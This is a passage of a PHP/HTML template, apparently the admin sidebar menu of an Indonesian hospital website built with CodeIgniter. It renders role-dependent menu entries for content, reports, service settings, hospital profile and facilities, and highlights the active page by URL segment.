<?PHP }else{?>
   <!--Menu list item-->
   <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li ><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li ><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php } ?>



<?php if ($this->uri->segment('1') == 'Laporan'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">Laporan</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li class="active-link" ><a href="<?php echo base_url('Laporan');?>">Laporan (SKM dan SAKIP)</a></li>
        <li ><a href="<?php echo base_url('Laporan_kinerja');?>">Laporan Kinerja Layanan</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php }elseif ($this->uri->segment('1') == 'Laporan_kinerja'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">Laporan</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Laporan');?>">Laporan (SKM dan SAKIP)</a></li>
        <li class="active-link" ><a href="<?php echo base_url('Laporan_kinerja');?>">Laporan Kinerja Layanan</a></li>
    </ul>
</li>
<?PHP } else {?>
   <!--Menu list item-->
   <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/report.jpg')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">Laporan</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Laporan');?>">Laporan (SKM dan SAKIP)</a></li>
        <li><a href="<?php echo base_url('Laporan_kinerja');?>">Laporan Kinerja Layanan</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php } ?>


<?php if($this->uri->segment('1') == 'Zona_integritas'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Zona_integritas');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Zona Integritas</span>
        </a>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="<?php echo base_url('Zona_integritas');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Zona Integritas</span>
    </a>
</li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Pengaduan_masyarakat'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Pengaduan_masyarakat');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.jpg')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Pengaduan Masyarakat</span>
        </a>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="<?php echo base_url('Pengaduan_masyarakat');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.jpg')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Pengaduan Masyarakat</span>
    </a>
</li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Jenis_layanan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/set.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting Layanan</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Jenis_layanan')?>">Jenis_layanan</a></li>
            <li><a href="<?php echo base_url('Tempat_pelayanan')?>">Tempat Pelayanan</a></li>
            <li><a href="<?php echo base_url('Tarif_layanan')?>">Tarif Layanan</a></li>
            <li><a href="<?php echo base_url('Sosial_media')?>">Sosial Media</a></li>
        </ul>
    </li>
   
<?php }elseif($this->uri->segment('1') == 'Tempat_pelayanan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/set.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting Layanan</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li><a href="<?php echo base_url('Jenis_layanan')?>">Jenis_layanan</a></li>
            <li class="active-link"><a href="<?php echo base_url('Tempat_pelayanan')?>">Tempat Pelayanan</a></li>
            <li><a href="<?php echo base_url('Tarif_layanan')?>">Tarif Layanan</a></li>
            <li><a href="<?php echo base_url('Sosial_media')?>">Sosial Media</a></li>
        </ul>
    </li>
    <?php }elseif($this->uri->segment('1') == 'Tarif_layanan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/set.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting Layanan</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li><a href="<?php echo base_url('Jenis_layanan')?>">Jenis_layanan</a></li>
            <li><a href="<?php echo base_url('Tempat_pelayanan')?>">Tempat Pelayanan</a></li>
            <li class="active-link"><a href="<?php echo base_url('Tarif_layanan')?>">Tarif Layanan</a></li>
            <li><a href="<?php echo base_url('Sosial_media')?>">Sosial Media</a></li>
        </ul>
    </li>
    <?php }elseif($this->uri->segment('1') == 'Sosial_media'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/set.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting Layanan</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li><a href="<?php echo base_url('Jenis_layanan')?>">Jenis_layanan</a></li>
            <li><a href="<?php echo base_url('Tempat_pelayanan')?>">Tempat Pelayanan</a></li>
            <li><a href="<?php echo base_url('Tarif_layanan')?>">Tarif Layanan</a></li>
            <li class="active-link"><a href="<?php echo base_url('Sosial_media')?>">Sosial Media</a></li>
         </ul>
    </li>
    
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/set.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting Layanan</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Jenis_layanan')?>">Jenis_layanan</a></li>
        <li><a href="<?php echo base_url('Tempat_pelayanan')?>">Tempat Pelayanan</a></li>
            <li><a href="<?php echo base_url('Tarif_layanan')?>">Tarif Layanan</a></li>
        <li><a href="<?php echo base_url('Sosial_media')?>">Sosial Media</a></li>
    </ul>
</li>
<?php } ?>
<?php if($this->uri->segment('1') == 'Ganti_pass'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
            <li><a href="<?php echo base_url('Hak_akses')?>">Hak Akses</a></li>
        </ul>
    </li>
    <?php }elseif($this->uri->segment('1') == 'Hak_akses'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
            <li class="active-link"><a href="<?php echo base_url('Hak_akses')?>">Hak Akses</a></li>
        </ul>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
        <li><a href="<?php echo base_url('Hak_akses')?>">Hak Akses</a></li>
    </ul>
</li>
<?php } ?>
</ul>


<!---------------Rekam Medik------------------------>
<?php } elseif  ($status == 2 ) { ?> 
 <ul id="mainnav-menu" class="list-group">
     <!--Category name-->
     <li class="list-header">Menu Utama</li>

     <?php if($this->uri->segment('1') == 'Beranda'){ ?>
        <!--Menu list item-->
        <li class="active-sub">
            <a href="<?php echo base_url('Beranda');?>">
                <!-- <i class="demo-pli-home"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">Beranda</span>
            </a>
        </li>
    <?php }else{ ?>
       <!--Menu list item-->
       <li>
        <a href="<?php echo base_url('Beranda');?>">
            <!-- <i class="demo-pli-home"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Beranda</span>
        </a>
    </li>
<?php } ?>

<?php if($this->uri->segment('1') == 'Laporan_kinerja'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="<?php echo base_url('Laporan_kinerja');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Indikator Pelayanan</span>
        </a>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="<?php echo base_url('Laporan_kinerja');?>">
            <img src="<?php echo base_url('assets/admin/img/icon/zona_i.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Indikator Pelayanan</span>
    </a>
</li>
<?php } ?>


<?php if($this->uri->segment('1') == 'Ganti_pass'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-computer-secure"></i> -->
            <span class="menu-title">Setting</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
            <li class="active-link"><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
        </ul>
    </li>
<?php }else{ ?>
 <!--Menu list item-->
 <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/setting.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-computer-secure"></i> -->
        <span class="menu-title">Setting</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <!-- <li><a href="app-file-manager.html">Akun</a></li> -->
        <li><a href="<?php echo base_url('Ganti_pass')?>">Ganti Password</a></li>
    </ul>
</li>
<?php } ?>

</ul>


<!---------------Humas------------------------>
<?php } elseif  ($status == 3 ) { ?>
 <ul id="mainnav-menu" class="list-group">
     <!--Category name-->
     <li class="list-header">Menu Utama</li>

     <?php if($this->uri->segment('1') == 'Beranda'){ ?>
        <!--Menu list item-->
        <li class="active-sub">
            <a href="<?php echo base_url('Beranda');?>">
                <!-- <i class="demo-pli-home"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">Beranda</span>
            </a>
        </li>
    <?php }else{ ?>
       <!--Menu list item-->
       <li>
        <a href="<?php echo base_url('Beranda');?>">
            <!-- <i class="demo-pli-home"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">Beranda</span>
        </a>
    </li>
<?php } ?>

<?php if ($info == 0){ ?>
                         <?php if($this->uri->segment('1') == 'Profil_rs'){ ?>
                            <!--Menu list item-->
                            <li class="active-sub">
                                <a href="#">
                                    <!-- <i class="demo-pli-boot-2"></i> -->
                                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                                    <span class="menu-title">DATA MASTER</span>
                                    <i class="arrow"></i>
                                </a>

                                <!--Submenu-->
                                <ul class="collapse">
                                    <li class="active-link"><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                                </ul>
                            </li>
                            <!--Menu list item-->
                        <?php }elseif($this->uri->segment('1') == 'Sejarah') { ?>
                          <!--Menu list item-->
                          <li class="active-sub">
                            <a 
                            href="#">
                            <!-- <i class="demo-pli-boot-2"></i> -->
                            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                            <span class="menu-title">DATA MASTER</span>
                            <i class="arrow"></i>
                        </a>

                        <!--Submenu-->
                        <ul class="collapse">
                            <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                            <li class="active-link" ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                            <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                            <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                        </ul>
                    </li>
                    <!--Menu list item-->
                     <!--Menu list item-->
        <?php }elseif($this->uri->segment('1') == 'Direksi') { ?>
          <!--Menu list item-->
          <li class="active-sub">
            <a href="#">
                <!-- <i class="demo-pli-boot-2"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">DATA MASTER</span>
                <i class="arrow"></i>
            </a>

            <!--Submenu-->
            <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li class="active-link"><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
            </ul>
        </li>
        <!--Menu list item-->
                <?php }elseif($this->uri->segment('1') == 'Visi_misi') {?>
                  <!--Menu list item-->
                  <li class="active-sub">
                    <a href="#">
                        <!-- <i class="demo-pli-boot-2"></i> -->
                        <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                        <span class="menu-title">DATA MASTER</span>
                        <i class="arrow"></i>
                    </a>

                    <!--Submenu-->
                    <ul class="collapse">
                        <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                        <li class="active-link"><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                        <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                    </ul>
                </li>
                <!--Menu list item-->
                <?php }elseif($this->uri->segment('1') == 'Stuktur_organisasi') {?>
                  <!--Menu list item-->
                  <li class="active-sub">
                    <a href="#">
                        <!-- <i class="demo-pli-boot-2"></i> -->
                        <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                        <span class="menu-title">DATA MASTER</span>
                        <i class="arrow"></i>
                    </a>

                    <!--Submenu-->
                    <ul class="collapse">
                        <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                        <li ><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                        <li class="active-link"><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                    </ul>
                </li>
                <!--Menu list item-->
            <?php }else{ ?>
               <!--Menu list item-->
               <li>
                <a href="#">
                    <!-- <i class="demo-pli-boot-2"></i> -->
                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                    <span class="menu-title">Profile RS</span>
                    <i class="arrow"></i>
                </a>

                <!--Submenu-->
                <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                    <li><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                </ul>
            </li>
            <!--Menu list item-->
        <?php } ?>
    <?php }else{ ?>
        <?php if($this->uri->segment('1') == 'Profil_rs'){ ?>
            <!--Menu list item-->
            <li class="active-sub">
                <a href="#">
                    <!-- <i class="demo-pli-boot-2"></i> -->
                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                    <span class="menu-title">DATA MASTER</span>
                    <i class="arrow"></i>
                </a>

                <!--Submenu-->
                <ul class="collapse">
                    <li class="active-link"><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                </ul>
            </li>
            <!--Menu list item-->
        <?php }elseif($this->uri->segment('1') == 'Sejarah') { ?>
          <!--Menu list item-->
          <li class="active-sub">
            <a href="#">
                <!-- <i class="demo-pli-boot-2"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">DATA MASTER</span>
                <i class="arrow"></i>
            </a>

            <!--Submenu-->
            <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
                    <li class="active-link" ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
            </ul>
        </li>
        <!--Menu list item-->
        <?php }elseif($this->uri->segment('1') == 'Direksi') { ?>
          <!--Menu list item-->
          <li class="active-sub">
            <a href="#">
                <!-- <i class="demo-pli-boot-2"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">DATA MASTER</span>
                <i class="arrow"></i>
            </a>

            <!--Submenu-->
            <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li class="active-link"><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
            </ul>
        </li>
        <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Visi_misi') {?>
      <!--Menu list item-->
      <li class="active-sub">
        <a href="#">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">DATA MASTER</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
            <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
            <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
            <li class="active-link"><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
            <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif ($this->uri->segment('1') == 'Struktur_organisasi'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/data.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">DATA MASTER</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
        <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
        <li  class="active-link"><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php }else{ ?>
    <!--Menu list item-->
    <li>
        <a href="#">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">DATA MASTER</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Profil_rs');?>">Profil RS</a></li>
        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
        <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
        <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php } } ?>


<?php if($this->uri->segment('1') == 'Pelayanan'){ ?>
  <!--Menu list item-->
  <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">SARANA DAN PRASARANA</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li  class="active-link"><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
</li>
<!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Layanan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Ruangan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
    </li>

    <?php }elseif($this->uri->segment('1') == 'Poli'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
    </li>
    <?php }elseif($this->uri->segment('1') == 'Dokter'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li  class="active-link"><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
    </li>

<?PHP }else{?>
   <!--Menu list item-->
   <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">SARANA DAN PRASARANA</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php } ?>



<?php if($this->uri->segment('1') == 'Berita'){ ?>
  <!--Menu list item-->
  <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li class="active-link"><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<?php }elseif($this->uri->segment('1') == 'Pengumuman'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
